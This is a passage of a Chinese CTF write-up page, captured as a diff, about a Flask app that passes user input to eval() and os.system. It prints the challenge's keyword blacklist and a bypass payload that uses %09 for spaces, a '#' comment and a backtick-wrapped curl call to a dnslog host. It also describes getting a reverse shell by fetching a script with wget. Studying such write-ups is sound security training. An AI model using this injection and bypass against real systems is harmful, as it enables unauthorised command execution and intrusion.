+    <span class="nx">num</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">values</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;num&#34;</span><span class="p">)</span>
+    <span class="nx">log</span> <span class="o">=</span> <span class="s2">&#34;echo {0} {1} {2}&gt; ./tmp/log.txt&#34;</span><span class="o">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">time</span><span class="o">.</span><span class="nx">strftime</span><span class="p">(</span><span class="s2">&#34;%Y%m%d-%H%M%S&#34;</span><span class="p">,</span><span class="nx">time</span><span class="o">.</span><span class="nx">localtime</span><span class="p">()),</span><span class="nx">ip</span><span class="p">,</span><span class="nx">num</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">num</span><span class="p">)</span><span class="o">:</span>
+        <span class="k">try</span><span class="o">:</span>
+            <span class="nx">data</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span><span class="nx">num</span><span class="p">)</span>
+            <span class="nx">os</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nx">log</span><span class="p">)</span>
+        <span class="nx">except</span><span class="o">:</span>
+            <span class="nx">pass</span>
+        <span class="k">return</span> <span class="nx">str</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+    <span class="k">else</span><span class="o">:</span>
+        <span class="k">return</span> <span class="s2">&#34;waf!!&#34;</span>
+
+<span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="o">:</span>
+    <span class="nx">app</span><span class="o">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="nx">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>  
+</code></pre></td></tr></table>
+</div>
+</div><p>这里就是传了一个num参数进去，这里如果参数通过了waf，那么就会计算结果，并且system函数执行log，猜测这里是通过注入一些危险的命令去执行
+这里有一个waf，过滤了很多东西</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;import&#39;</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">,</span><span class="s1">&#39;)&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="s1">&#39;;&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;{&#39;</span><span class="p">,</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="s1">&#39;getattr&#39;</span><span class="p">,</span><span class="s1">&#39;os&#39;</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;class&#39;</span><span class="p">,</span><span class="s1">&#39;subclasses&#39;</span><span class="p">,</span><span class="s1">&#39;mro&#39;</span><span class="p">,</span><span class="s1">&#39;request&#39;</span><span class="p">,</span><span class="s1">&#39;args&#39;</span><span class="p">,</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span><span class="s1">&#39;if&#39;</span><span class="p">,</span><span class="s1">&#39;subprocess&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">,</span><span class="s1">&#39;open&#39;</span><span class="p">,</span><span class="s1">&#39;popen&#39;</span><span class="p">,</span><span class="s1">&#39;builtins&#39;</span><span class="p">,</span><span class="s1">&#39;compile&#39;</span><span class="p">,</span><span class="s1">&#39;execfile&#39;</span><span class="p">,</span><span class="s1">&#39;from_pyfile&#39;</span><span class="p">,</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;local&#39;</span><span class="p">,</span><span class="s1">&#39;self&#39;</span><span class="p">,</span><span class="s1">&#39;item&#39;</span><span class="p">,</span><span class="s1">&#39;getitem&#39;</span><span class="p">,</span><span class="s1">&#39;getattribute&#39;</span><span class="p">,</span><span class="s1">&#39;func_globals&#39;</span><span class="p">,</span><span class="s1">&#39;__init__&#39;</span><span class="p">,</span><span class="s1">&#39;join&#39;</span><span class="p">,</span><span class="s1">&#39;__dict__&#39;</span><span class="p">]</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是由于命令执行没有回显，所以用dnslog，这样操作可以绕过
+空格用%09代替
+直接注入代码会报错，因为num代码会走进eval造成报错，所以需要加一个#作为注释符来绕过</p>
+<p><img src="https://img-blog.csdnimg.cn/96fbafcd55e44bb2abcd1c5d0e88b2a8.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="mi">1</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">60</span><span class="nx">curl</span><span class="o">%</span><span class="mi">09</span><span class="nx">zeej2v</span><span class="o">.</span><span class="nx">dnslog</span><span class="o">.</span><span class="nx">cn</span><span class="o">%</span><span class="mi">60</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://img-blog.csdnimg.cn/cd8b3fd229434f81bda513713bedeca8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>可以成功执行命令</p>
+<p><img src="https://img-blog.csdnimg.cn/f8a1c06abef24aa5815fcaee7c134e96.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>试着反弹shell，直接执行弹shell不行，很多被过滤了，所以我们利用wget去传命令上去执行</p>
+<p><img src="https://img-blog.csdnimg.cn/afa8306a958b47f799c36d8f39169cec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p><img src="https://img-blog.csdnimg.cn/d6faed214cba4f749b902efbef4d8a6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p><img src="https://img-blog.csdnimg.cn/87a13fa402f64214b1f1e2d84d39e0f0.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p><img src="https://img-blog.csdnimg.cn/44185ab2ce9c40848ea6bb48ad43fbe6.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p><img src="https://img-blog.csdnimg.cn/5541c7114d1f44c6993a9e0cfbed42e9.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/xyb2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022祥云杯] wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/qwb2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022强网杯] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/typhoonconctf2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[TyphoonCon CTF 2022] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ciscn2022_half/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2022] Semifinals</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ciscn2022_crt/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2022] online_crt</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Huamang
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
+        <br>
+        
+        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </body>
+</html>
